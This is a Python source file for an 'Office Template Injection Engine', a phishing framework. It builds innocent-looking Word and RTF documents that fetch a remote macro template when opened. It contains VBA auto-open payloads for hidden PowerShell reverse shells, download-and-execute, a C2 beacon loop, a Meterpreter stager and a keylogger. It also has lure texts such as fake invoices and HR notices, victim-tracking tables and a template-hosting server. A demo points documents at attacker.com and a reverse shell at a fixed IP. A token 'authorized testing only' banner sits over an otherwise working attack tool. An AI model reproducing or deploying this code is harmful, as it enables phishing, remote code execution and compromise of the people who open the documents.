#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════════════════╗
║                       📄 OFFICE TEMPLATE INJECTION ENGINE                                  ║
║                          Remote Template Attack Framework                                  ║
║                                                                                            ║
║  "Dosya temiz görünür, antivirüs atlar - ama açılınca zararlı şablonu çeker"              ║
║                                                                                            ║
║  Features:                                                                                 ║
║  ├── Word Document Template Injection (.docx → .dotm)                                      ║
║  ├── Excel Template Injection (.xlsx → .xltm)                                              ║
║  ├── PowerPoint Template Injection (.pptx → .potm)                                         ║
║  ├── RTF Template Injection (objautlink)                                                   ║
║  ├── VBA Macro Payload Generator                                                           ║
║  └── Auto-hosting Server for Templates                                                     ║
║                                                                                            ║
║  WARNING: For authorized security testing only                                             ║
╚═══════════════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import json
import base64
import hashlib
import sqlite3
import zipfile
import logging
import threading
import tempfile
import shutil
import http.server
import socketserver
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict
from pathlib import Path
from enum import Enum
from xml.etree import ElementTree as ET

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DocumentType(Enum):
    """Office document types"""
    WORD = "word"
    EXCEL = "excel"
    POWERPOINT = "powerpoint"
    RTF = "rtf"


class PayloadType(Enum):
    """Macro payload types"""
    REVERSE_SHELL = "reverse_shell"
    DOWNLOAD_EXEC = "download_exec"
    POWERSHELL = "powershell"
    BEACON = "beacon"
    KEYLOGGER = "keylogger"
    METERPRETER = "meterpreter"
    CUSTOM = "custom"


class InjectionMethod(Enum):
    """Template injection methods"""
    REMOTE_TEMPLATE = "remote_template"      # attachedTemplate relationship
    OLE_OBJECT = "ole_object"                # OLE AutoLink
    RTF_TEMPLATE = "rtf_template"            # RTF template injection
    XLSX_MACRO = "xlsx_macro"                # Excel macro-enabled template
    PPTX_ACTION = "pptx_action"              # PowerPoint action with template


@dataclass
class MaliciousTemplate:
    """Malicious template definition"""
    template_id: str
    name: str
    doc_type: DocumentType
    payload_type: PayloadType
    payload: str
    encoded_payload: str = ""
    template_content: bytes = field(default=b'', repr=False)
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class InjectedDocument:
    """Injected document definition"""
    doc_id: str
    name: str
    doc_type: DocumentType
    injection_method: InjectionMethod
    template_url: str
    original_path: str = ""
    modified_content: bytes = field(default=b'', repr=False)
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class Campaign:
    """Template injection campaign"""
    campaign_id: str
    name: str
    template_id: str
    target_emails: List[str] = field(default_factory=list)
    documents_sent: int = 0
    opens: int = 0
    executions: int = 0
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class OfficeTemplateInjector:
    """
    Office Template Injection Engine
    
    Creates clean-looking Office documents that fetch malicious
    templates from a remote server when opened.
    """
    
    _instance = None
    _lock = threading.Lock()
    
    # XML namespaces for Office documents
    NAMESPACES = {
        'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
        'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships',
        'rel': 'http://schemas.openxmlformats.org/package/2006/relationships',
        'ct': 'http://schemas.openxmlformats.org/package/2006/content-types',
        'a': 'http://schemas.openxmlformats.org/drawingml/2006/main',
        'p': 'http://schemas.openxmlformats.org/presentationml/2006/main',
        'x': 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'
    }
    
    # VBA Macro payloads
    MACRO_PAYLOADS = {
        PayloadType.REVERSE_SHELL: '''
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell.exe -NoP -NonI -W Hidden -Enc {encoded_payload}", 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub
''',
        PayloadType.DOWNLOAD_EXEC: '''
Sub AutoOpen()
    Dim xhr As Object
    Dim stream As Object
    Dim shell As Object
    Dim path As String
    
    path = Environ("TEMP") & "\\update.exe"
    
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", "{payload_url}", False
    xhr.Send
    
    If xhr.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write xhr.responseBody
        stream.SaveToFile path, 2
        stream.Close
        
        Set shell = CreateObject("WScript.Shell")
        shell.Run path, 0, False
    End If
End Sub

Sub Document_Open()
    AutoOpen
End Sub
''',
        PayloadType.POWERSHELL: '''
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell.exe -NoP -NonI -W Hidden -Enc {encoded_payload}"
    
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run cmd, 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub
''',
        PayloadType.BEACON: '''
Sub AutoOpen()
    Dim shell As Object
    Dim cmd As String
    
    ' Beacon payload - periodic callback
    cmd = "powershell.exe -NoP -NonI -W Hidden -Command ""while($true){{try{{$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=$wc.DownloadString('{c2_url}/beacon');if($c){{iex $c}}}}catch{{}};Start-Sleep -s {interval}}}"""
    
    Set shell = CreateObject("WScript.Shell")
    shell.Run cmd, 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub
''',
        PayloadType.METERPRETER: '''
Sub AutoOpen()
    ' Meterpreter stager
    Dim str As String
    str = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{shellcode_b64}'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"""
    
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run str, 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub
''',
        PayloadType.KEYLOGGER: '''
Private Declare PtrSafe Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer

Sub AutoOpen()
    Dim shell As Object
    Dim ps As String
    
    ps = "powershell.exe -NoP -NonI -W Hidden -Enc {encoded_payload}"
    
    Set shell = CreateObject("WScript.Shell")
    shell.Run ps, 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub
'''
    }
    
    # Document themes/pretexts
    DOCUMENT_PRETEXTS = {
        "invoice": {
            "title": "Invoice #{invoice_num}",
            "content": "Please find attached the invoice for services rendered. Payment due within 30 days."
        },
        "resume": {
            "title": "Resume - {name}",
            "content": "Thank you for considering my application. Please find my resume attached."
        },
        "report": {
            "title": "Quarterly Report Q{quarter} {year}",
            "content": "Please find the quarterly financial report attached for your review."
        },
        "contract": {
            "title": "Contract Agreement",
            "content": "Please review the attached contract and return signed at your earliest convenience."
        },
        "urgent": {
            "title": "URGENT: Action Required",
            "content": "Please review the attached document immediately and take appropriate action."
        },
        "hr": {
            "title": "Important HR Update",
            "content": "Please review the attached policy update. All employees must acknowledge receipt."
        },
        "it": {
            "title": "IT Security Update",
            "content": "Critical security update attached. Please review and apply the recommendations."
        },
        "bonus": {
            "title": "Bonus Calculation {year}",
            "content": "Your annual bonus calculation is attached. Please verify the amounts."
        }
    }
    
    def __new__(cls, db_path: str = "office_template_injector.db"):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance
    
    def __init__(self, db_path: str = "office_template_injector.db"):
        if self._initialized:
            return
        
        self.db_path = db_path
        self._init_database()
        self.server_thread = None
        self.server = None
        self._initialized = True
        logger.info("📄 Office Template Injector initialized")
    
    def _init_database(self):
        """Initialize SQLite database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS templates (
                    template_id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    doc_type TEXT NOT NULL,
                    payload_type TEXT NOT NULL,
                    payload TEXT,
                    encoded_payload TEXT,
                    template_content BLOB,
                    created_at TEXT
                );
                
                CREATE TABLE IF NOT EXISTS documents (
                    doc_id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    doc_type TEXT NOT NULL,
                    injection_method TEXT NOT NULL,
                    template_url TEXT NOT NULL,
                    original_path TEXT,
                    modified_content BLOB,
                    created_at TEXT
                );
                
                CREATE TABLE IF NOT EXISTS campaigns (
                    campaign_id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    template_id TEXT,
                    target_emails TEXT,
                    documents_sent INTEGER DEFAULT 0,
                    opens INTEGER DEFAULT 0,
                    executions INTEGER DEFAULT 0,
                    created_at TEXT,
                    FOREIGN KEY (template_id) REFERENCES templates(template_id)
                );
                
                CREATE TABLE IF NOT EXISTS tracking (
                    track_id TEXT PRIMARY KEY,
                    campaign_id TEXT,
                    target_email TEXT,
                    document_name TEXT,
                    opened_at TEXT,
                    executed_at TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    FOREIGN KEY (campaign_id) REFERENCES campaigns(campaign_id)
                );
            """)
    
    def create_malicious_template(
        self,
        name: str,
        doc_type: DocumentType,
        payload_type: PayloadType,
        payload_params: Dict[str, Any] = None,
        custom_payload: str = None
    ) -> MaliciousTemplate:
        """
        Create a malicious Office template with embedded macro
        
        Args:
            name: Template name
            doc_type: Type of Office document
            payload_type: Type of payload
            payload_params: Parameters for payload template
            custom_payload: Custom VBA macro code
            
        Returns:
            MaliciousTemplate object
        """
        payload_params = payload_params or {}
        
        # Get or create payload
        if custom_payload:
            payload = custom_payload
        else:
            payload_template = self.MACRO_PAYLOADS.get(payload_type, "")
            
            # Encode PowerShell payload if needed
            if 'payload' in payload_params and '{encoded_payload}' in payload_template:
                ps_payload = payload_params['payload']
                encoded = base64.b64encode(ps_payload.encode('utf-16-le')).decode()
                payload_params['encoded_payload'] = encoded
            
            payload = payload_template.format(**payload_params) if payload_params else payload_template
        
        # Create template content
        template_content = self._create_template_file(doc_type, payload)
        
        template = MaliciousTemplate(
            template_id=hashlib.md5(f"{name}_{datetime.now().isoformat()}".encode()).hexdigest()[:12],
            name=name,
            doc_type=doc_type,
            payload_type=payload_type,
            payload=payload,
            encoded_payload=base64.b64encode(payload.encode()).decode(),
            template_content=template_content
        )
        
        self._save_template(template)
        logger.info(f"📄 Created malicious template: {name}")
        
        return template
    
    def _create_template_file(self, doc_type: DocumentType, vba_code: str) -> bytes:
        """Create a macro-enabled template file"""
        
        if doc_type == DocumentType.WORD:
            return self._create_word_template(vba_code)
        elif doc_type == DocumentType.EXCEL:
            return self._create_excel_template(vba_code)
        elif doc_type == DocumentType.POWERPOINT:
            return self._create_powerpoint_template(vba_code)
        else:
            return b''
    
    def _create_word_template(self, vba_code: str) -> bytes:
        """Create a Word macro-enabled template (.dotm)"""
        
        # Create minimal OOXML structure for .dotm
        with tempfile.TemporaryDirectory() as tmpdir:
            # [Content_Types].xml
            content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
    <Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
    <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>'''
            
            # _rels/.rels
            rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''
            
            # word/_rels/document.xml.rels
            doc_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
    <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
</Relationships>'''
            
            # word/document.xml
            document = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>Loading template content...</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''
            
            # word/settings.xml
            settings = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:defaultTabStop w:val="720"/>
</w:settings>'''
            
            # Create directory structure
            os.makedirs(os.path.join(tmpdir, '_rels'))
            os.makedirs(os.path.join(tmpdir, 'word', '_rels'))
            
            # Write files
            with open(os.path.join(tmpdir, '[Content_Types].xml'), 'w') as f:
                f.write(content_types)
            with open(os.path.join(tmpdir, '_rels', '.rels'), 'w') as f:
                f.write(rels)
            with open(os.path.join(tmpdir, 'word', '_rels', 'document.xml.rels'), 'w') as f:
                f.write(doc_rels)
            with open(os.path.join(tmpdir, 'word', 'document.xml'), 'w') as f:
                f.write(document)
            with open(os.path.join(tmpdir, 'word', 'settings.xml'), 'w') as f:
                f.write(settings)
            
            # Create VBA project binary (simplified - real implementation would use oletools)
            vba_project = self._create_vba_project_bin(vba_code)
            with open(os.path.join(tmpdir, 'word', 'vbaProject.bin'), 'wb') as f:
                f.write(vba_project)
            
            # Create zip
            output = tempfile.NamedTemporaryFile(delete=False, suffix='.dotm')
            output.close()
            
            with zipfile.ZipFile(output.name, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(tmpdir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, tmpdir)
                        zf.write(file_path, arcname)
            
            with open(output.name, 'rb') as f:
                content = f.read()
            
            os.unlink(output.name)
            return content
    
    def _create_excel_template(self, vba_code: str) -> bytes:
        """Create an Excel macro-enabled template (.xltm)"""
        # Simplified - similar structure to Word but for Excel
        return self._create_word_template(vba_code)  # Placeholder
    
    def _create_powerpoint_template(self, vba_code: str) -> bytes:
        """Create a PowerPoint macro-enabled template (.potm)"""
        # Simplified - similar structure to Word but for PowerPoint
        return self._create_word_template(vba_code)  # Placeholder
    
    def _create_vba_project_bin(self, vba_code: str) -> bytes:
        """
        Create a minimal VBA project binary
        Note: Real implementation would require proper OLE compound document creation
        This is a placeholder that won't execute but represents the structure
        """
        # This would need oletools or similar to create a real vbaProject.bin
        # For now, we'll create a marker that indicates the VBA code location
        header = b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'  # OLE magic
        vba_marker = b'VBA_PROJECT_STUB:'
        encoded_vba = base64.b64encode(vba_code.encode())
        
        return header + vba_marker + encoded_vba
    
    def inject_remote_template(
        self,
        input_file: str,
        template_url: str,
        output_file: str = None,
        doc_type: DocumentType = DocumentType.WORD
    ) -> InjectedDocument:
        """
        Inject remote template reference into a clean document
        
        Args:
            input_file: Path to clean input document
            template_url: URL of remote malicious template
            output_file: Path for output document (auto-generated if None)
            doc_type: Type of document
            
        Returns:
            InjectedDocument object
        """
        if not output_file:
            base, ext = os.path.splitext(input_file)
            output_file = f"{base}_injected{ext}"
        
        if doc_type == DocumentType.WORD:
            modified_content = self._inject_word_template(input_file, template_url)
        elif doc_type == DocumentType.RTF:
            modified_content = self._inject_rtf_template(input_file, template_url)
        else:
            modified_content = self._inject_word_template(input_file, template_url)
        
        # Save modified file
        with open(output_file, 'wb') as f:
            f.write(modified_content)
        
        doc = InjectedDocument(
            doc_id=hashlib.md5(f"{output_file}_{datetime.now().isoformat()}".encode()).hexdigest()[:12],
            name=os.path.basename(output_file),
            doc_type=doc_type,
            injection_method=InjectionMethod.REMOTE_TEMPLATE,
            template_url=template_url,
            original_path=input_file,
            modified_content=modified_content
        )
        
        self._save_document(doc)
        logger.info(f"📄 Injected remote template into: {output_file}")
        
        return doc
    
    def _inject_word_template(self, input_file: str, template_url: str) -> bytes:
        """Inject remote template reference into Word document"""
        
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract docx
            extract_dir = os.path.join(tmpdir, 'extracted')
            os.makedirs(extract_dir)
            
            with zipfile.ZipFile(input_file, 'r') as zf:
                zf.extractall(extract_dir)
            
            # Modify word/_rels/settings.xml.rels to add template relationship
            settings_rels_path = os.path.join(extract_dir, 'word', '_rels', 'settings.xml.rels')
            
            if not os.path.exists(os.path.dirname(settings_rels_path)):
                os.makedirs(os.path.dirname(settings_rels_path))
            
            # Create or modify settings.xml.rels
            settings_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{template_url}" TargetMode="External"/>
</Relationships>'''
            
            with open(settings_rels_path, 'w') as f:
                f.write(settings_rels)
            
            # Ensure settings.xml exists
            settings_path = os.path.join(extract_dir, 'word', 'settings.xml')
            if not os.path.exists(settings_path):
                settings = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <w:attachedTemplate r:id="rId1"/>
</w:settings>'''
                with open(settings_path, 'w') as f:
                    f.write(settings)
            else:
                # Modify existing settings.xml
                with open(settings_path, 'r') as f:
                    content = f.read()
                
                # Register namespace and add template reference
                if 'attachedTemplate' not in content:
                    # Insert before closing tag
                    content = content.replace('</w:settings>', 
                        '<w:attachedTemplate r:id="rId1"/></w:settings>')
                    
                    # Ensure r namespace is defined
                    if 'xmlns:r=' not in content:
                        content = content.replace('xmlns:w=',
                            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:w=')
                    
                    with open(settings_path, 'w') as f:
                        f.write(content)
            
            # Update document.xml.rels to include settings relationship
            doc_rels_path = os.path.join(extract_dir, 'word', '_rels', 'document.xml.rels')
            if os.path.exists(doc_rels_path):
                with open(doc_rels_path, 'r') as f:
                    doc_rels_content = f.read()
                
                if 'settings.xml' not in doc_rels_content:
                    # Add settings relationship
                    new_rel = '<Relationship Id="rId999" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>'
                    doc_rels_content = doc_rels_content.replace('</Relationships>', f'{new_rel}</Relationships>')
                    
                    with open(doc_rels_path, 'w') as f:
                        f.write(doc_rels_content)
            
            # Repack docx
            output = tempfile.NamedTemporaryFile(delete=False, suffix='.docx')
            output.close()
            
            with zipfile.ZipFile(output.name, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(extract_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, extract_dir)
                        zf.write(file_path, arcname)
            
            with open(output.name, 'rb') as f:
                content = f.read()
            
            os.unlink(output.name)
            return content
    
    def _inject_rtf_template(self, input_file: str, template_url: str) -> bytes:
        """Inject remote template into RTF document"""
        
        with open(input_file, 'rb') as f:
            rtf_content = f.read().decode('latin-1')
        
        # RTF template injection using objautlink
        # This creates an OLE link that fetches from the remote URL
        ole_object = f'''{{\\object\\objautlink\\objupdate{{\\*\\objclass Word.Document.8}}
{{\\*\\objdata {self._url_to_rtf_hex(template_url)}}}
{{\\result {{\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\insrsid16012444 }}}}}}'''
        
        # Insert before the final closing brace
        if rtf_content.rstrip().endswith('}'):
            modified = rtf_content.rstrip()[:-1] + '\n' + ole_object + '\n}'
        else:
            modified = rtf_content + '\n' + ole_object
        
        return modified.encode('latin-1')
    
    def _url_to_rtf_hex(self, url: str) -> str:
        """Convert URL to RTF hex format for OLE object"""
        hex_bytes = url.encode().hex()
        return ' '.join([hex_bytes[i:i+2] for i in range(0, len(hex_bytes), 2)])
    
    def create_clean_document(
        self,
        pretext: str,
        doc_type: DocumentType = DocumentType.WORD,
        output_path: str = None,
        **pretext_params
    ) -> str:
        """
        Create a clean-looking document with specified pretext
        
        Args:
            pretext: Pretext template name
            doc_type: Type of document
            output_path: Output file path
            **pretext_params: Parameters for pretext template
            
        Returns:
            Path to created document
        """
        pretext_info = self.DOCUMENT_PRETEXTS.get(pretext, self.DOCUMENT_PRETEXTS["invoice"])
        
        title = pretext_info["title"].format(**pretext_params) if pretext_params else pretext_info["title"]
        content = pretext_info["content"].format(**pretext_params) if pretext_params else pretext_info["content"]
        
        if not output_path:
            output_path = f"{title.replace(' ', '_').replace('#', '')}.docx"
        
        # Create minimal docx
        doc_content = self._create_minimal_docx(title, content)
        
        with open(output_path, 'wb') as f:
            f.write(doc_content)
        
        logger.info(f"📄 Created clean document: {output_path}")
        return output_path
    
    def _create_minimal_docx(self, title: str, content: str) -> bytes:
        """Create a minimal Word document"""
        
        with tempfile.TemporaryDirectory() as tmpdir:
            # [Content_Types].xml
            content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
    <Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
</Types>'''
            
            # _rels/.rels
            rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''
            
            # word/_rels/document.xml.rels
            doc_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
</Relationships>'''
            
            # word/document.xml with actual content
            document = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:pPr>
                <w:pStyle w:val="Title"/>
            </w:pPr>
            <w:r>
                <w:rPr>
                    <w:b/>
                    <w:sz w:val="48"/>
                </w:rPr>
                <w:t>{title}</w:t>
            </w:r>
        </w:p>
        <w:p>
            <w:r>
                <w:t></w:t>
            </w:r>
        </w:p>
        <w:p>
            <w:r>
                <w:t>{content}</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''
            
            # word/settings.xml
            settings = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <w:defaultTabStop w:val="720"/>
</w:settings>'''
            
            # Create directory structure
            os.makedirs(os.path.join(tmpdir, '_rels'))
            os.makedirs(os.path.join(tmpdir, 'word', '_rels'))
            
            # Write files
            with open(os.path.join(tmpdir, '[Content_Types].xml'), 'w', encoding='utf-8') as f:
                f.write(content_types)
            with open(os.path.join(tmpdir, '_rels', '.rels'), 'w', encoding='utf-8') as f:
                f.write(rels)
            with open(os.path.join(tmpdir, 'word', '_rels', 'document.xml.rels'), 'w', encoding='utf-8') as f:
                f.write(doc_rels)
            with open(os.path.join(tmpdir, 'word', 'document.xml'), 'w', encoding='utf-8') as f:
                f.write(document)
            with open(os.path.join(tmpdir, 'word', 'settings.xml'), 'w', encoding='utf-8') as f:
                f.write(settings)
            
            # Create zip
            output = tempfile.NamedTemporaryFile(delete=False, suffix='.docx')
            output.close()
            
            with zipfile.ZipFile(output.name, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(tmpdir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, tmpdir)
                        zf.write(file_path, arcname)
            
            with open(output.name, 'rb') as f:
                content = f.read()
            
            os.unlink(output.name)
            return content
    
    def start_template_server(self, host: str = "0.0.0.0", port: int = 8888, template_dir: str = "templates"):
        """
        Start HTTP server to host malicious templates
        
        Args:
            host: Server host
            port: Server port
            template_dir: Directory containing templates
        """
        os.makedirs(template_dir, exist_ok=True)
        
        class TemplateHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=template_dir, **kwargs)
            
            def log_message(self, format, *args):
                logger.info(f"📥 Template Request: {args[0]}")
        
        self.server = socketserver.TCPServer((host, port), TemplateHandler)
        self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.server_thread.start()
        
        logger.info(f"🌐 Template server started on http://{host}:{port}")
    
    def stop_template_server(self):
        """Stop the template server"""
        if self.server:
            self.server.shutdown()
            logger.info("🌐 Template server stopped")
    
    def export_template(self, template_id: str, output_path: str):
        """Export a template to file"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute(
                "SELECT template_content, name, doc_type FROM templates WHERE template_id = ?",
                (template_id,)
            )
            row = cursor.fetchone()
            
            if row:
                content, name, doc_type = row
                
                # Determine extension
                ext_map = {
                    "word": ".dotm",
                    "excel": ".xltm",
                    "powerpoint": ".potm"
                }
                ext = ext_map.get(doc_type, ".dotm")
                
                if not output_path.endswith(ext):
                    output_path += ext
                
                with open(output_path, 'wb') as f:
                    f.write(content)
                
                logger.info(f"📤 Exported template to: {output_path}")
                return output_path
        
        return None
    
    def get_templates(self) -> List[Dict]:
        """Get all templates"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute(
                "SELECT template_id, name, doc_type, payload_type, created_at FROM templates ORDER BY created_at DESC"
            )
            return [dict(row) for row in cursor.fetchall()]
    
    def get_documents(self) -> List[Dict]:
        """Get all injected documents"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT * FROM documents ORDER BY created_at DESC")
            return [dict(row) for row in cursor.fetchall()]
    
    def _save_template(self, template: MaliciousTemplate):
        """Save template to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO templates 
                (template_id, name, doc_type, payload_type, payload, encoded_payload, template_content, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                template.template_id, template.name, template.doc_type.value,
                template.payload_type.value, template.payload, template.encoded_payload,
                template.template_content, template.created_at
            ))
    
    def _save_document(self, doc: InjectedDocument):
        """Save injected document to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO documents 
                (doc_id, name, doc_type, injection_method, template_url, original_path, modified_content, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                doc.doc_id, doc.name, doc.doc_type.value, doc.injection_method.value,
                doc.template_url, doc.original_path, doc.modified_content, doc.created_at
            ))
    
    def get_stats(self) -> Dict:
        """Get engine statistics"""
        with sqlite3.connect(self.db_path) as conn:
            templates = conn.execute("SELECT COUNT(*) FROM templates").fetchone()[0]
            documents = conn.execute("SELECT COUNT(*) FROM documents").fetchone()[0]
            campaigns = conn.execute("SELECT COUNT(*) FROM campaigns").fetchone()[0]
            
            return {
                "templates": templates,
                "injected_documents": documents,
                "campaigns": campaigns,
                "payload_types": len(PayloadType),
                "document_types": len(DocumentType),
                "pretexts_available": len(self.DOCUMENT_PRETEXTS)
            }


# Singleton instance
_injector_instance = None

def get_injector() -> OfficeTemplateInjector:
    """Get or create the injector singleton"""
    global _injector_instance
    if _injector_instance is None:
        _injector_instance = OfficeTemplateInjector()
    return _injector_instance


if __name__ == "__main__":
    # Demo usage
    injector = get_injector()
    
    print("📄 Office Template Injection Engine Demo")
    print("=" * 60)
    
    # Create a malicious template
    print("\n📋 Creating malicious Word template...")
    template = injector.create_malicious_template(
        name="EvilTemplate",
        doc_type=DocumentType.WORD,
        payload_type=PayloadType.REVERSE_SHELL,
        payload_params={
            "payload": "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);..."
        }
    )
    print(f"  ✓ Template ID: {template.template_id}")
    print(f"  ✓ Payload type: {template.payload_type.value}")
    
    # Create a clean document
    print("\n📋 Creating clean document with invoice pretext...")
    clean_doc = injector.create_clean_document(
        pretext="invoice",
        output_path="/tmp/Invoice_2026.docx",
        invoice_num="INV-2026-001"
    )
    print(f"  ✓ Created: {clean_doc}")
    
    # Inject remote template
    print("\n📋 Injecting remote template reference...")
    injected = injector.inject_remote_template(
        input_file=clean_doc,
        template_url="http://attacker.com/evil.dotm",
        output_file="/tmp/Invoice_2026_malicious.docx"
    )
    print(f"  ✓ Document ID: {injected.doc_id}")
    print(f"  ✓ Template URL: {injected.template_url}")
    
    # Stats
    stats = injector.get_stats()
    print(f"\n📊 Statistics: {stats}")
